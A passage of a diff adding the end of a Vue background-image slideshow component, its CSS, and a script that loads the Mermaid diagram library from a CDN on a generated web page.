+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
 
       </main>
     </div>
